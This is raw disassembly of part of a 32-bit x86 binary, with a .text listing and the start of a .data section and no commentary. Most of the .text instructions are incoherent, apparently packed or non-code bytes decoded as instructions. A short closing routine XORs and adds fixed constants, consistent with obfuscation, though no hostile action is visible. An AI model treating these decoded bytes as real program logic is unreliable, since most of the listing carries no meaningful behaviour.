  411aa7:	xor    DWORD PTR [esi+0xb],0xafa4dda8
  411aae:	aad    0x62
  411ab0:	dec    ecx
  411ab1:	test   cl,bh
  411ab3:	pop    esp
  411ab4:	cmp    BYTE PTR [edi],cl
  411ab6:	or     eax,0x8102b0c4
  411abb:	jl     0x411b27
  411abd:	or     eax,0x6528069c
  411ac2:	mov    ch,bl
  411ac4:	cmp    ch,BYTE PTR [ebx-0x4c89bb07]
  411aca:	popa   
  411acb:	inc    ecx
  411acc:	lahf   
  411acd:	std    
  411ace:	imul   ebp,DWORD PTR ds:0x48a4b6,0x10617c69
  411ad8:	pushf  
  411ad9:	sub    edx,esi
  411adb:	adc    ebx,DWORD PTR [edi+0x6691c285]
  411ae1:	xlat   BYTE PTR ds:[ebx]
  411ae2:	test   DWORD PTR [ecx+0x5e],edi
  411ae5:	pop    ds
  411ae6:	dec    ebx
  411ae7:	fadd   st,st(0)
  411ae9:	sti    
  411aea:	test   eax,0x8b3bf18c
  411aef:	int    0xf3
  411af1:	ins    DWORD PTR es:[edi],dx
  411af2:	test   eax,0xc9bb07b8
  411af7:	pop    ebx
  411af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411af9:	sahf   
  411afa:	adc    edx,DWORD PTR [eax-0x5df4e0bf]
  411b00:	add    edx,DWORD PTR [ebx+ebp*8+0x1a52b81a]
  411b07:	cmp    ah,0x7
  411b0a:	retf   0x118e
  411b0d:	or     edx,DWORD PTR [ebp-0x4]
  411b10:	lods   al,BYTE PTR ds:[esi]
  411b11:	xor    al,0xb2
  411b13:	lods   eax,DWORD PTR ds:[esi]
  411b14:	and    eax,0x6e3034e6
  411b19:	xor    bl,BYTE PTR [esp+ebx*2+0x51239d49]
  411b20:	das    
  411b21:	lock call 0x61d7917d
  411b27:	mov    dl,BYTE PTR [eax+edi*1+0x3c]
  411b2b:	and    ch,BYTE PTR [eax+0x62]
  411b2e:	retf   0x479c
  411b31:	cmp    eax,0x5b3c4225
  411b36:	jle    0x411b10
  411b38:	out    dx,eax
  411b39:	pop    ss
  411b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b3b:	mov    esp,esi
  411b3d:	repz addr16 jae 0x411b9c
  411b41:	mov    cl,0x2e
  411b43:	outs   dx,BYTE PTR ds:[esi]
  411b44:	test   eax,0x31d7f815
  411b49:	jne    0x411b42
  411b4b:	inc    eax
  411b4c:	pop    edi
  411b4d:	mov    ch,0xd9
  411b4f:	add    BYTE PTR [ebx-0x65],0xf6
  411b53:	ins    DWORD PTR es:[edi],dx
  411b54:	mov    ebp,0x465a3733
  411b59:	fldcw  WORD PTR [ecx-0x5a]
  411b5c:	das    
  411b5d:	pop    esp
  411b5e:	lahf   
  411b5f:	mov    DWORD PTR [edx],eax
  411b61:	lods   eax,DWORD PTR ds:[esi]
  411b62:	jns    0x411b81
  411b64:	mul    DWORD PTR [esi]
  411b66:	imul   ebx,DWORD PTR [ecx+0x6d],0x351de4aa
  411b6d:	retf   0xd13d
  411b70:	js     0x411b7b
  411b72:	pop    ds
  411b73:	sti    
  411b74:	cdq    
  411b75:	mov    esi,0xd1590ab
  411b7a:	push   0x237046c
  411b7f:	xor    ch,BYTE PTR [esi]
  411b81:	fdiv   DWORD PTR [esi+ebp*2+0x70]
  411b85:	sahf   
  411b86:	aaa    
  411b87:	and    ch,dl
  411b89:	adc    ecx,0xffffffc0
  411b8c:	sbb    eax,0xea0e8970
  411b91:	mov    ah,0x28
  411b93:	(bad)  
  411b94:	retf   
  411b95:	and    al,0xb
  411b97:	push   ebx
  411b98:	cli    
  411b99:	lods   eax,DWORD PTR ds:[esi]
  411b9a:	out    0x9a,al
  411b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b9d:	out    0x74,eax
  411b9f:	jge    0x411c17
  411ba1:	dec    ebx
  411ba2:	xchg   ebx,eax
  411ba3:	scas   eax,DWORD PTR es:[edi]
  411ba4:	or     al,0x6a
  411ba6:	pop    ebx
  411ba7:	inc    ebp
  411ba8:	je     0x411b31
  411baa:	pop    ss
  411bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bac:	fldcw  WORD PTR [ecx]
  411bae:	cld    
  411baf:	dec    esp
  411bb0:	ret    0x4a23
  411bb3:	jnp    0x411b39
  411bb5:	mov    edx,0x329cf480
  411bba:	fucomip st,st(7)
  411bbc:	lock inc eax
  411bbe:	ins    BYTE PTR es:[edi],dx
  411bbf:	cwde   
  411bc0:	call   0xb5f3:0x2d99f211
  411bc7:	pushf  
  411bc8:	mov    edi,0x3da39bd2
  411bcd:	pop    ebx
  411bce:	fcom   DWORD PTR [eax]
  411bd0:	push   0x32
  411bd2:	sub    eax,0x729e608a
  411bd7:	sbb    ebx,DWORD PTR [ecx+0x2d51f517]
  411bdd:	ins    BYTE PTR es:[edi],dx
  411bde:	ins    DWORD PTR es:[edi],dx
  411bdf:	xchg   BYTE PTR [eax],bl
  411be1:	out    0xd,al
  411be3:	cmc    
  411be4:	icebp  
  411be5:	xchg   ecx,eax
  411be6:	stc    
  411be7:	jl     0x411c0d
  411be9:	mov    ah,0x81
  411beb:	loop   0x411b83
  411bed:	repz cmp BYTE PTR fs:[ecx+0x7f0ce1de],al
  411bf5:	fimul  WORD PTR [edx+0x74814661]
  411bfb:	mov    edx,0x44e31efb
  411c00:	je     0x411c15
  411c02:	shl    BYTE PTR [ecx+ebx*1-0x69],0x96
  411c07:	hlt    
  411c08:	jl     0x411c47
  411c0a:	sbb    DWORD PTR [edi],esp
  411c0c:	aam    0xa
  411c0e:	pusha  
  411c0f:	retf   
  411c10:	fdivp  st(3),st
  411c12:	and    BYTE PTR [ebx-0x221b4f73],al
  411c18:	jb     0x411bb5
  411c1a:	gs pushf 
  411c1c:	pop    ecx
  411c1d:	xchg   dh,dh
  411c1f:	test   al,0xb2
  411c21:	int3   
  411c22:	mov    WORD PTR [esi+0x177062c3],ds
  411c28:	lea    edx,[ebp+0x16117329]
  411c2e:	add    eax,0xab411c72
  411c33:	mov    edx,0xaaf58171
  411c38:	sub    al,0xb1
  411c3a:	loopne 0x411c2c
  411c3c:	xor    eax,edx
  411c3e:	push   esi
  411c3f:	mov    esi,DWORD PTR [ebp+0x8]
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x7dad6c4
  411c5b:	pop    edi
  411c5c:	pop    ecx
  411c5d:	call   0x7c10:0x7e7e4bc7
  411c64:	jle    0x411ce4
  411c66:	ins    BYTE PTR es:[edi],dx
  411c67:	out    dx,al
  411c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c69:	jle    0x411c6f
  411c6b:	xor    dl,bh
  411c6d:	push   esi
  411c6e:	xor    BYTE PTR es:[ebx-0x7b],ch
  411c72:	fisub  WORD PTR [ebx-0x44a75364]
  411c78:	sbb    DWORD PTR [esi+0x6bbeb8a0],esi
  411c7e:	and    BYTE PTR [edx+ecx*2+0x5a],ch
  411c82:	pop    es
  411c83:	sub    DWORD PTR [ebx+0x3e0bbd3],0xbff83670
  411c8d:	test   BYTE PTR [esi-0x192ae3a8],0x1c
  411c94:	dec    edi
  411c95:	jp     0x411c65
  411c97:	repz aam 0x49
  411c9a:	daa    
  411c9b:	and    eax,0x26b22e2b
  411ca0:	and    al,0x74
  411ca2:	cmp    esi,DWORD PTR [edi+esi*4]
  411ca5:	fdivr  st,st(5)
  411ca7:	xlat   BYTE PTR ds:[ebx]
  411ca8:	sti    
  411ca9:	adc    edx,DWORD PTR ds:0x1ca4f2c6
  411caf:	xor    BYTE PTR [edi-0x629e0681],ah
  411cb5:	pop    ebx
  411cb6:	sub    DWORD PTR ds:0x652d3ec5,ebx
  411cbc:	sub    al,0xca
  411cbe:	das    
  411cbf:	ins    DWORD PTR es:[edi],dx
  411cc0:	js     0x411d14
  411cc2:	cmp    BYTE PTR [edi],ah
  411cc4:	repnz pop ebx
  411cc6:	jge    0x411d09
  411cc8:	pop    es
  411cc9:	add    BYTE PTR [eiz*4+0x739565e],0xcd
  411cd1:	outs   dx,DWORD PTR ds:[esi]
  411cd2:	lock adc al,0xdb
  411cd5:	pusha  
  411cd6:	sub    ch,0xf3
  411cd9:	ret    0xf339
  411cdc:	iret   
  411cdd:	pop    edx
  411cde:	cmp    esi,DWORD PTR [esi+0x2bdfcc0c]
  411ce4:	loopne 0x411c89
  411ce6:	mov    cl,0x2f
  411ce8:	dec    esi
  411ce9:	or     eax,0x1a6b82d7
  411cee:	pop    esi
  411cef:	or     eax,0xf58bc13e
  411cf4:	setp   BYTE PTR [ebx-0x1d573e5a]
  411cfb:	inc    edi
  411cfc:	xchg   edx,eax
  411cfd:	pop    ss
  411cfe:	and    eax,0xba7eed90
  411d03:	inc    ecx
  411d04:	leave  
  411d05:	jg     0x411d39
  411d07:	dec    ecx
  411d08:	add    al,0xd6
  411d0a:	push   edx
  411d0b:	mov    eax,ds:0x6e6ad8c
  411d10:	xchg   al,cl
  411d12:	adc    edi,DWORD PTR [ecx-0x69a6e795]
  411d18:	ds aaa 
  411d1a:	enter  0x3849,0x3f
  411d1e:	or     eax,0x7f4b6907
  411d23:	push   ss
  411d24:	mov    dl,BYTE PTR [edx+0x62]
  411d27:	inc    eax
  411d28:	pusha  
  411d29:	mov    edi,0x636bf529
  411d2e:	mov    bh,0x16
  411d30:	xor    esi,DWORD PTR [ebx]
  411d32:	clc    
  411d33:	loope  0x411cd6
  411d35:	fidivr DWORD PTR [esi]
  411d37:	jo     0x411cfd
  411d39:	xchg   DWORD PTR [ebx-0x667ea5d7],esi
  411d3f:	sbb    eax,0x4ddff69d
  411d44:	outs   dx,DWORD PTR ds:[esi]
  411d45:	fidivr WORD PTR [ebx+0x31]
  411d48:	fsubrp st(6),st
  411d4a:	sub    WORD PTR [ebx],ax
  411d4d:	into   
  411d4e:	xchg   ecx,eax
  411d4f:	adc    BYTE PTR [ebx+0x62],bh
  411d52:	lds    esi,FWORD PTR [eax-0x442a8244]
  411d58:	and    dh,BYTE PTR [ecx-0x5dec200c]
  411d5e:	push   cs
  411d5f:	mov    bh,0xa6
  411d61:	jnp    0x411d35
  411d63:	push   es
  411d64:	sub    eax,0x2cb11834
  411d69:	cmp    al,0x14
  411d6b:	or     eax,DWORD PTR [ebx]
  411d6d:	sahf   
  411d6e:	fsubp  st(3),st
  411d70:	out    dx,eax
  411d71:	xchg   DWORD PTR [esi-0x60ce34bc],edx
  411d77:	adc    eax,0x3e6e9a11
  411d7c:	test   DWORD PTR [eax+0x38],edx
  411d7f:	adc    ecx,eax
  411d81:	into   
  411d82:	xor    ebx,edx
  411d84:	shl    DWORD PTR [ecx-0x2e],0x7c
  411d88:	xchg   esp,eax
  411d89:	mov    ?,WORD PTR [ebx+0x57]
  411d8c:	repnz adc BYTE PTR [edi-0x2f],0x74
  411d91:	inc    ecx
  411d92:	fwait
  411d93:	jge    0x411dc9
  411d95:	retf   0x6fd9
  411d98:	iret   
  411d99:	push   ds
  411d9a:	je     0x411d87
  411d9c:	jl     0x411d60
  411d9e:	xchg   ecx,eax
  411d9f:	push   edi
  411da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411da1:	jmp    0x7571:0x21d4f87f
  411da8:	es pop es
  411daa:	lods   al,BYTE PTR ds:[esi]
  411dab:	pop    edi
  411dac:	neg    DWORD PTR [edi+0x37]
  411daf:	mov    ecx,DWORD PTR [esi]
  411db1:	test   BYTE PTR [eax-0x52],dl
  411db4:	mov    dl,0x48
  411db6:	sub    ah,BYTE PTR [ecx+0x21]
  411db9:	fs inc esp
  411dbb:	aad    0x32
  411dbd:	out    0x9c,al
  411dbf:	frstor [edx-0x617d24c5]
  411dc5:	popa   
  411dc6:	pop    esp
  411dc7:	scas   al,BYTE PTR es:[edi]
  411dc8:	jp     0x411d7f
  411dca:	ror    DWORD PTR [edx-0x60],0xad
  411dce:	fs pop edi
  411dd0:	loopne 0x411e03
  411dd2:	lock add al,bl
  411dd5:	mov    dh,0x75
  411dd7:	sub    eax,0xa4b89baf
  411ddc:	outs   dx,BYTE PTR ds:[esi]
  411ddd:	dec    edx
  411dde:	inc    ebx
  411ddf:	retf   
  411de0:	cli    
  411de1:	cmp    al,0x23
  411de3:	and    edi,ebp
  411de5:	and    DWORD PTR [edi+edx*1+0x17],ecx
  411de9:	into   
  411dea:	xchg   edi,eax
  411deb:	push   edi
  411dec:	sti    
  411ded:	xchg   ebx,eax
  411dee:	jne    0x411e12
  411df0:	add    dh,0xf6
  411df3:	fsub   DWORD PTR [edi]
  411df5:	pop    edi
  411df6:	xor    cl,dh
  411df8:	push   esp
  411df9:	mov    bh,0x81
  411dfb:	push   ebx
  411dfc:	shl    eax,1
  411dfe:	jnp    0x411de5
  411e00:	push   edx
  411e01:	int3   
  411e02:	xchg   DWORD PTR [ebp+0x3d22d78],eax
  411e08:	adc    esi,ebx
  411e0a:	mov    ecx,ds
  411e0c:	inc    edi
  411e0d:	mov    DWORD PTR [edi+0xd],ebx
  411e10:	lods   al,BYTE PTR ds:[esi]
  411e11:	pop    es
  411e12:	cmp    DWORD PTR [esi],edx
  411e14:	mov    dl,0x45
  411e16:	xchg   edx,eax
  411e17:	xor    al,0x99
  411e19:	outs   dx,DWORD PTR ds:[esi]
  411e1a:	fwait
  411e1b:	xchg   ebx,eax
  411e1c:	ins    BYTE PTR es:[edi],dx
  411e1d:	test   BYTE PTR [esi-0x7e9253a6],cl
  411e23:	push   ebx
  411e24:	pop    ss
  411e25:	cmp    al,0xc3
  411e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e28:	scas   eax,DWORD PTR es:[edi]
  411e29:	push   esp
  411e2a:	lahf   
  411e2b:	xchg   esi,eax
  411e2c:	or     al,0xec
  411e2e:	sti    
  411e2f:	test   al,0x80
  411e31:	mov    al,ds:0x7582220
  411e36:	inc    edi
  411e37:	scas   al,BYTE PTR es:[edi]
  411e38:	sbb    BYTE PTR [eax],bh
  411e3a:	push   0xffffff8d
  411e3c:	pop    ecx
  411e3d:	mov    ebp,0xf5f2ea8d
  411e42:	aam    0x83
  411e44:	jb     0x411e82
  411e46:	fld    DWORD PTR es:[esi-0x21]
  411e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e4b:	mov    WORD PTR [eax-0x1f],gs
  411e4e:	mov    bh,0xca
  411e50:	pop    eax
  411e51:	mov    ds:0x32b8f919,al
  411e56:	call   0xb31a7e2d
  411e5b:	outs   dx,BYTE PTR ds:[esi]
  411e5c:	mov    dh,BYTE PTR [eax]
  411e5e:	mov    ecx,0x2b0a9040
  411e63:	push   ds
  411e64:	hlt    
  411e65:	mov    eax,ds:0x74480f57
  411e6a:	fst    DWORD PTR [ebp-0x43]
  411e6d:	in     al,0xb0
  411e6f:	inc    ebp
  411e70:	dec    ecx
  411e71:	loop   0x411e5d
  411e73:	mov    eax,0xe892378d
  411e78:	mov    ah,0xca
  411e7a:	arpl   WORD PTR [eax+0x40],cx
  411e7d:	and    eax,0xd0f8ad91
  411e82:	xchg   edi,eax
  411e83:	dec    esi
  411e84:	cmp    DWORD PTR [esi+0x54],eax
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
